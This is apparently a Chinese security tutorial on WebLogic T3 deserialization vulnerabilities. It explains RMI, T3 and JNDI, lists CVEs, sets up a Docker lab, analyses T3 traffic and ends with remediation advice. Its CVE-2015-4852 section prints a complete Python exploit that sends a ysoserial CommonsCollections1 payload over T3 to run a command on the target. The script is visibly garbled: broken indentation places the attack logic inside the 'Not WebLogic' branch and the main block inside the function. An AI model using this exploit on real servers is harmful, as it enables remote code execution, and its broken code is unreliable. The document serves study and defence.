[TOC]



# ==Webloic_T3反序列化漏洞==

教材内容

## WebLogic_T3反序列化漏洞（一）

### 一、前置知识

#### 1.1 RMI协议

 RMI(Remote Method Invocation)即远程方法调用。它能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输。

 Java RMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP。

RMI远程方法调用的过程一般有以下几个部分参与：

1. 客户端对象（RMI Client）
2. 服务端对象（RMI Server）
3. 客户端代理对象（stub）：远程对象在客户端上的代理。
4. 服务端代理对象（skeleton）：读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。
5. RMI 注册表（RMI register）：其中注册了远程对象，并由RMI 客户端查找已注册的远程对象。其以URL形式注册远程对象，并向客户端回复对远程对象的引用。

RMI调用流程如图：

![image-20220613172250065](https://gitee.com/ymq_typroa/typroa/raw/main/20220613172250.png)

1. 服务端创建并注册远程对象，用于客户端访问。
2. 客户端使用 JNDI lookup 去查找远程服务器上的RMI服务上的远程对象。
3. RMI register返回给客户端远程对象的Stub。
4. 客户端通过Stub对象调用远程主机对象上的方法。
5. Stub代理客户端处理远程对象调用请求，并且序列化调用请求后通过JRMP协议传输，发送给服务端。
6. 服务端接收到请求后，Skeleton调用方法。
7. 服务端进行执行然后将返回的结果对象传给Skeleton对象。
8. Skeleton接收到结果对象，代理服务端将结果进行序列化，而后发送给客户端
9. 客户端Stub对象接收到序列化的结果对象，并交由客户端反序列化结果对象。

#### 1.2 WebLogic RMI

 WebLogic RMI可以说是WebLogic对Java RMI的实现，与上述的Java RMI调用过程基本一样，在功能和实现方式上有些差异。两者差异如下：

- WebLogic RMI支持集群部署和负载均衡。
- webLogic支持stub和skeleton动态生成，将对象部署到RMI 注册中心或JNDI时，webLogic将自动生成必要的代理。
- WebLogic RMI在进行数据传输时，主要使用自己私有的T3协议进行通信（还有基于CORBA的IIOP协议）。

#### 1.3 T3协议

 T3协议是WebLogic私有的协议，相比于JRMP协议多了如下的一些特性：

1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。
2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。

#### 1.4 JNDI

 JNDI(Java Naming and Directory Interface)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。 JNDI可以兼容和访问现有目录服务如：DNS、XNam、LDAP、CORBA对象服务、文件系统、RMI、DSML v1&v2、NIS等。

如下：

```
jdbc://<domain>:<port>rmi://<domain>:<port>ldap://<domain>:<port>
```

#### 1.5 WebLogic T3反序列化漏洞简介

 WebLogic T3反序列化漏洞从利用方式来划分可以分为前后期，前期直接通过T3协议发送恶意反序列化对象，后期为利用T3协议配合JRMP或JNDI接口反向发送反序列化数据。

WebLogic T3反序列化历史漏洞：

| CVE号         | 受影响的组件           | 受影响版本                             |
| :------------ | :--------------------- | :------------------------------------- |
| CVE-2018-3252 | WLS Core Components    | 10.3.6.0, 12.1.3.0, 12.2.1.3           |
| CVE-2018-3245 | WLS Core Components    | 10.3.6.0, 12.1.3.0, 12.2.1.3           |
| CVE-2018-3191 | WLS Core Components    | 10.3.6.0, 12.1.3.0, 12.2.1.3           |
| CVE-2018-2893 | WLS Core Components    | 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 |
| CVE-2018-2628 | WLS Core Components    | 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 |
| CVE-2017-3248 | Core Components        | 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 |
| CVE-2016-3510 | Oracle WebLogic Server | 10.3.6.0, 12.1.3.0, 12.2.1.0           |
| CVE-2016-0638 | Oracle WebLogic Server | 10.3.6, 12.1.2, 12.1.3, 12.2.1         |
| CVE-2015-4852 | Oracle WebLogic Server | 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0 |

其中前期利用方式的漏洞有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510等。

而后期利用方式有CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3191、CVE-2018-3245等。

### 二、漏洞原理分析

> ### 一、漏洞原理
>
> T3协议的反序列化漏洞原理在于，WebLogic服务器在接收并处理T3协议数据时，会进行反序列化操作。如果攻击者能够构造出恶意的T3协议数据，这些数据在反序列化过程中可能会被转换为恶意对象，进而执行任意代码或命令。这通常涉及到Java虚拟机的远程方法调用（RMI）机制，攻击者可以利用这一机制在本地虚拟机上调用远端代码。

#### 2.1 环境搭建

服务器：Centos7.9 安装docker（IP：192.168.219.206）

jdk版本：jdk-7u21（https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html）

weblogic版本：10.3.6.0（https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html）

环境部署脚本工具：https://github.com/QAX-A-Team/WeblogicEnvironment

操作步骤：

1. 下载环境部署脚本，解压后，在解压的目录下创建jdks与weblogics这两个目录。

   ![image-20220615093220399](https://gitee.com/ymq_typroa/typroa/raw/main/20220615093227.png)

2. 将下载的jdk-7u21-linux-x64.tar.gz放于jdks下，wls1036_generic.jar放于weblogics下。

   ![image-20220615093433594](https://gitee.com/ymq_typroa/typroa/raw/main/20220615093433.png)

3. 使用在部署脚本主目录下，使用如下命令构建docker镜像：

   ```
    docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .
   ```

4. 而后使用该镜像创建容器并运行。

   ```
    docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
   ```

注意：若第三步出现执行yum -y install libnsl失败时，出现如下错误：

```
Error: Failed to download metadata for repo 'appstream': Cannot prepare internal mirrorlist: No URLs in mirrorlist
```

可以在主目录下的Dockerfile中的这条命令前加上如下两条命令，而后重新构建docker镜像。

```
RUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*RUN sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
```

#### 2.2 T3协议流量分析

 利用相关漏洞利用工具与weblogic进行T3协议的通信，并实现weblogic rmi的调用过程，并使用wireshark抓取通信流量。找到响应的tcp数据包，右键->追踪流->TCP流。

![image-20220614170737839](https://gitee.com/ymq_typroa/typroa/raw/main/20220614170737.png)

 通信过程的TCP流如下：

![image-20220614172440600](https://gitee.com/ymq_typroa/typroa/raw/main/20220614172440.png)

 而后查看客户端发送的序列化数据的对应包，如下图：

![image-20220615105340296](https://gitee.com/ymq_typroa/typroa/raw/main/20220615105340.png)

这个数据包主要由四部分组成：

1. 数据包长度。
2. T3协议头。
3. 反序列化标志：T3协议中每个反序列化数据包前面都带有fe 01 00 00，而后再加上Java反序列化标志ac ed 00 05。
4. 序列化数据。

（注意：Java 反序列化数据开头包含两字节的魔术数字，这两个字节始终为十六进制的0xac 0xed，接下来是两字节的版本号这里为0x00 0x05。在T3协议的数据包中，在这个四个字节前还有四个字节 fe 01 00 00 ）

 这里的数据包只是我们使用漏洞利用工具发送的，其中就只有一段序列化数据，有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，如下图：

![image-20220614174259710](https://gitee.com/ymq_typroa/typroa/raw/main/20220614174259.png)

 T3数据包主要内容如下图：

![image-20220614180947697](https://gitee.com/ymq_typroa/typroa/raw/main/20220614180947.png)

 从上面我们可以知道第二到第七部分内容，开头都是ac ed 00 05，说明这些都是JAVA序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了，于是我们可以将第二至七部分的JAVA序列化数据的任意一个替换为恶意的序列化数据，或者直接将第一部分与恶意的序列化数据进行拼接后发送给服务端即可。

#### 2.3 CVE-2015-4852漏洞分析

 CVE-2015-4852可以说是WebLogic T3反序列化漏洞的开端，接下来我们将从这个漏洞去了解WebLogic T3反序列化漏洞。

 网上有许多针对CVE-2015-4852的exp，在网上找到以下python脚本与ysoserial工具进行漏洞利用。脚本功能如下：

1. 使用ysoserial工具生成的一个payload，其利用链为CommonsCollections1，执行的命令为在被攻击服务器的tmp下创建一个名为test_t3.txt的文件。
2. 使用上述已生成的payload添加到t3协议的数据包中，即将T3协议数据包第一部分与恶意的序列化数据进行拼接后发送给服务端。

```python
import struct # 负责大小端的转换
import subprocess
import socket
import re
import binascii

def generatePayload(gadget,cmd):    
    YSO_PATH = "ysoserial-master.jar"    
    popen = subprocess.Popen(['java', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)    
    return popen.stdout.read()

def T3Exploit(ip,port,payload):    
    sock =socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    # 初始化socket，前者指定用于服务器与服务器之间的网络通信，后者指定基于TCP的流式socket通信    
    sock.connect((ip, port))  
    # 建立socket连接    
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"  # socket握手消息    
    sock.sendall(handshake.encode())    
    data = sock.recv(1024)   # 接收第一个socket数据包，HELO    
    data1 = sock.recv(1024)  # 接收第二个socket数据包，:10.3.6.0.false    
    isweblogic = re.compile("HELO").findall(data.decode())   # 匹配字段中有无HELO    
    version = re.compile(":(.*).0.false").findall(data1.decode())  # 使用正则匹配服务器握手消息中返回的weblogic版本号    
    if isweblogic and version:        
        print("WebLogic: "+"".join(version))  # 输出weblogic版本号    
    else:        
        print("Not WebLogic")  # 对端可能不是
        weblogic    header = binascii.a2b_hex(b"00000000")  # 先占位4个字节，这四个字节表示数据包长度    
        # 以下为t3协议头    
        t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")    
        desflag = binascii.a2b_hex(b"fe010000")  # 反序列化数据标志 fe010000，    
        payload = header + t3header + desflag + payload  # 将各部分拼接，将ysoserial生成payload添加到后面    
        # 计算payload长度，并将长度字段放于前四个字节    
        payload = struct.pack(">I", len(payload)) + payload[4:]    
        sock.send(payload)
        
        if __name__ == "__main__":    
            ip = "192.168.219.206"    
            port = 7001    
            gadget = "CommonsCollections1"  # 指定使用CommonsCollections1反序列化利用链    
            cmd = "touch /tmp/test_t3.txt"  # 让被攻击服务器执行的指定命令，创建一个文件    
            payload = generatePayload(gadget, cmd)  # 使用ysoserial生成payload    
            T3Exploit(ip, port, payload)
```

 查看weblogic服务器上的tmp目录，发现已经成功创建文件test_t3.txt。

![image-20220614151210440](https://gitee.com/ymq_typroa/typroa/raw/main/20220614151217.png)

 漏洞的触发点在wlserver\server\lib\wlthint3client.jar\weblogic\rjvm\InboundMsgAbbrev.class中，其中的readObject()方法会处理使用T3协议传入的序列化数据。在readObject()方法中又去调用了InboundMsgAbbrev.ServerChannelInputStream的readObject方法，这里的var1即是Java序列化数据。

![image-20220615112414982](https://gitee.com/ymq_typroa/typroa/raw/main/20220615112415.png)

 查看ServerChannelInputStream这个类，发现其继承于ObjectInputStream，而且并没有重写readObject()方法，可以说这里没有对传入的序列化数据做任何处理，直接传入ObjectInputStream的readObject()方法中进行反序列化操作。

![image-20220615113222297](https://gitee.com/ymq_typroa/typroa/raw/main/20220615113222.png)

 而weblogic这个版本自带Apache Commons Collections3.2.0，于是我们可以利用ysoserial生成CommonsCollections1的payload进行利用，于是我们将T3协议的序列化数据替换成这个生成的payload即可触发反序列化漏洞。

![image-20220615120742889](https://gitee.com/ymq_typroa/typroa/raw/main/20220615120742.png)

#### 2.4 resolveClass与Java反序列化防御

 resolveClass方法是ObjectInputStream.readObject()方法执行时必定会进行调用的一个方法，其作用为类的序列化描述符加工成该类的Class对象。

![image-20220615153951674](https://gitee.com/ymq_typroa/typroa/raw/main/20220615153951.png)

 可以说当时用readObject()方法进行反序列化时，其必定会调用该方法。于是我们可以重写resolveClass方法，使用黑名单的方式，让攻击者无法获取用于执行命令的相关类的Class对象。上述 CVE-2015-4852漏洞分析中，我们看到其在ServerChannelInputStream中重写了resolveClass方法，但并没有对传入的数据做任何处理，而是直接使用父类ObjectInputStream的resolveClass方法。

![image-20220615155638493](https://gitee.com/ymq_typroa/typroa/raw/main/20220615155638.png)

 而WebLogic对CVE-2015-4852的修复措施也是在resloveClass里加上 ClassFilter.isBlackListed黑名单过滤。

![image-20220615161605359](https://gitee.com/ymq_typroa/typroa/raw/main/20220615161605.png)

### 三、修复建议

1. 下载安装最新的补丁。
2. 若服务在外网的情况下，可以使用以下两种方式进行防御：
   - 采用web代理，这样只能转发HTTP的请求，而不会转发T3协议的请求。
   - 使用负载均衡，并且指定需要进行负载均衡的协议类型为HTTP，不接收其他的协议请求转发。

### 四、参考文章

1. WebLogic安全研究报告（https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704）
2. 浅析WebLogic 反序列化漏洞（https://cloud.tencent.com/developer/article/1957183#3.6）
3. Weblogic漏洞学习：T3反序列化（https://xz.aliyun.com/t/10365）